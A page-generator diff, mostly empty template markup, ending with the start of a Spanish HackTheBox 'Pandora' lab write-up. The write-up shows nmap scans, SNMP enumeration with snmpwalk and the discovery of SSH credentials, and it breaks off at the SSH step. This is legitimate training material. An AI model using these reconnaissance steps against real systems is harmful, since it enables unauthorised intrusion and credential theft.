+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+
+  
+
+
+
+<!-- Add header for code snippets -->
+
+
+
+<!-- Create heading anchors -->
+
+
+
+
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+
+    
+
+  
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+
+    
+
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+
+
+
+<!-- Wrap prompt element of blockquote with the <div> tag -->
+
+
+
+
+
+
+
+<!-- return -->
+
+
+
+
+
+
+
+<h1 data-toc-skip>Pandora HackTheBox</h1>
+
+<div class="post-meta text-muted">
+
+  <!-- author -->
+  <div>
+    
+    
+
+    
+
+    By
+    <em>
+      
+        <a href="https://twitter.com/username">T3sla</a>
+      
+    </em>
+  </div>
+
+  <div class="d-flex">
+    <div>
+      <!-- published date -->
+      <span>
+        Posted
+        <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/timeago.js
+-->
+
+<em class="timeago"
+    data-ts="1652917860"
+    
+      data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
+    
+    >
+  2022-05-18
+</em>
+
+      </span>
+
+      <!-- lastmod date -->
+      
+
+      <!-- read time -->
+      <!--
+  Calculate the post's reading time, and display the word count in tooltip
+ -->
+
+
+
+<!-- words per minute  -->
+
+
+
+
+
+
+
+
+
+
+<!-- return element -->
+<span class="readtime" data-toggle="tooltip" data-placement="bottom"
+  title="1208 words">
+  <em>6 min</em> read</span>
+
+
+      <!-- page views -->
+      
+    </div>
+
+  </div> <!-- .d-flex -->
+
+</div> <!-- .post-meta -->
+
+<div class="post-content">
+  <h1 id="bienvenidosa">Bienvenidos/a</h1>
+<p>Este artículo tratará la resolución de la máquina Pandora de la plataforma de Ciberseguridad <a href="https://hackthebox.com/">HackTheBox</a>.</p>
+<hr />
+
+<h2 id="información-sobre-la-máquina"><span class="mr-2">Información sobre la máquina</span><a href="#información-sobre-la-máquina" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
+<p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 500'%3E%3C/svg%3E" data-src="/assets/img/Images-Post-Pandora/infopandora.png" alt="Info Pandora" width="700" height="500" data-proofer-ignore>
+Bueno, esta máquina tiene una dificultad fácil, pero digo desde ya que no es una máquina fácil, ja, ja. Muy divertida y aprendí bastantes cosas en su momento. Sin duda mi máquina favorita &lt;3.</p>
+<h3 id="matrix"><span class="mr-2">Matrix</span><a href="#matrix" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
+<p><img data-src="/assets/img/Images-Post-Pandora/matrixpandora.png" alt="" data-proofer-ignore></p>
+<ul>
+  <li>SQLI (Sql Injection)</li>
+  <li>SNMP (Protocolo simple de administración de red)</li>
+  <li>UDP</li>
+  <li>Path Hijacking</li>
+  <li>CVE-2021-32099</li>
+  <li>Local Port Forwarding</li>
+</ul>
+<hr />
+
+<h2 id="reconocimiento"><span class="mr-2">Reconocimiento</span><a href="#reconocimiento" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
+<h3 id="nmap-tcp-udp"><span class="mr-2">Nmap (TCP-UDP)</span><a href="#nmap-tcp-udp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-sSU</span> <span class="nt">--min-rate</span> 12000 <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-v</span> 10.10.11.136
+nmap <span class="nt">-sS</span> <span class="nt">-sCV</span> <span class="nt">-n</span> <span class="nt">-p</span> 22,80 <span class="nt">-T5</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.10.11.136
+nmap <span class="nt">-sU</span> <span class="nt">-sCV</span> <span class="nt">-n</span> <span class="nt">-p</span> 161 <span class="nt">-T5</span> <span class="nt">-Pn</span> <span class="nt">-v</span> 10.10.11.136
+</pre></td></tr></tbody></table></code></div></div>
+<p><img data-src="/assets/img/Images-Post-Pandora/updtcpscan.png" alt="Recon UDP-TCP 65535" data-proofer-ignore>
+<img data-src="/assets/img/Images-Post-Pandora/tcpscan.png" alt="TCP" data-proofer-ignore>
+<img data-src="/assets/img/Images-Post-Pandora/udpscan.png" alt="UDP-SNMP" data-proofer-ignore>
+Procedemos a buscar exploits públicos que afecten a las versiones de estos servicios, pero no encontramos nada interesante.</p>
+<h3 id="servidor-web"><span class="mr-2">Servidor Web</span><a href="#servidor-web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
+<p>Demos un vistazo a lo que almacena el servidor web.
+<img data-src="/assets/img/Images-Post-Pandora/webpandora.png" alt="Web Pandora" data-proofer-ignore>
+Pues al parecer el servidor web almacena un sitio web estático y poco podríamos hacer, pero conseguimos un dominio.
+Procedemos a agregar el dominio.</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>vim /etc/hosts
+</pre></td></tr></tbody></table></code></div></div>
+<p><img data-src="/assets/img/Images-Post-Pandora/etc.png" alt="Resolucion DNS" data-proofer-ignore><br />
+Ya estaría haciendo la resolución DNS, podríamos buscar subdominios, pero los tiros no van por ahí.</p>
+<h3 id="snmp"><span class="mr-2">SNMP</span><a href="#snmp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
+<p>Ahora nos queda el SNMP.
+Buscando un poco encontramos bastante información (dejaré los recursos al final) vamos a emplear la herramienta snmpwalk.
+<img data-src="/assets/img/Images-Post-Pandora/snmpwalk.png" alt="SNMPWALK" data-proofer-ignore>
+<img data-src="/assets/img/Images-Post-Pandora/infosnmp.png" alt="SNMP info" data-proofer-ignore>
+Al ejecutar la herramienta nos da información bastante útil como la versión del Kernel Linux y un posible usuario (Daniel).
+<img data-src="/assets/img/Images-Post-Pandora/procesossnmp.png" alt="SNMP Procesos" data-proofer-ignore>
+Incluso podemos ver procesos que se están ejecutando.
+<img data-src="/assets/img/Images-Post-Pandora/snmpcreds.png" alt="SNMP credenciales" data-proofer-ignore>
+Luego de esperar un poco encontramos unas credenciales (yo envíe la salida del comando a un fichero para luego filtrar).</p>
+<div class="language-shell highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>snmpwalk <span class="nt">-v</span> 2c <span class="nt">-c</span> public 10.10.11.136 <span class="o">&gt;</span> snmp
+</pre></td></tr></tbody></table></code></div></div>
+<p><img data-src="/assets/img/Images-Post-Pandora/credenciales-ssh.png" alt="credenciales ssh" data-proofer-ignore></p>
+<hr />
+
+<h2 id="intrusión"><span class="mr-2">Intrusión</span><a href="#intrusión" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
+<h3 id="ssh"><span class="mr-2">SSH</span><a href="#ssh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
+<p>Vamos a verificar que las credenciales obtenidas anteriormente sean válidas.</p>
